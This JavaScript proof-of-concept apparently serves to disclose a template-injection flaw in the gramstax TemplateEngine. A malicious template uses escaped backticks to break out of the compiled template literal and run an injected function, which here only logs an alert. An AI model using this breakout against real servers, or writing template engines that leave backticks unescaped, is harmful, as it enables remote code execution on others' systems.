/**
 * Case 1: Template Breakout via Backticks
 *
 * This POC demonstrates how raw backticks (`) in the template string can break out
 * of the JavaScript template literal used during the compilation process.
 *
 * Vulnerability: The TemplateEngine does not escape backticks in the raw template text
 * before wrapping it in backticks for the final render function.
 *
 * Risk: If an attacker can control part of the template string, they can achieve
 * Remote Code Execution (RCE) on the server.
 */

import {TemplateEngine} from "../packages/gramstax/src/template/engine.js"

console.log(`--- CASE 1: BACKTICK BREAKOUT ---`)

// The template contains a backtick followed by code execution logic.
// The engine wraps this in `...`, resulting in: `... ` + code + ` ...`
const maliciousTemplate = `
  <g-base>
    <g-message>
      Safe Text \` + (function(){ 
        console.log("!!! VULNERABILITY ALERT: Backtick breakout successful !!!"); 
        return "[CODE EXECUTED]"; 
      })() + \` More Safe Text
    </g-message>
  </g-base>
`

console.log(`Compiling template...`)
const messages = TemplateEngine.compileBlockMessage(maliciousTemplate)

console.log(`Executing compiled function...`)
const result = messages.default.default({})
console.log(`Final Result:`, result)
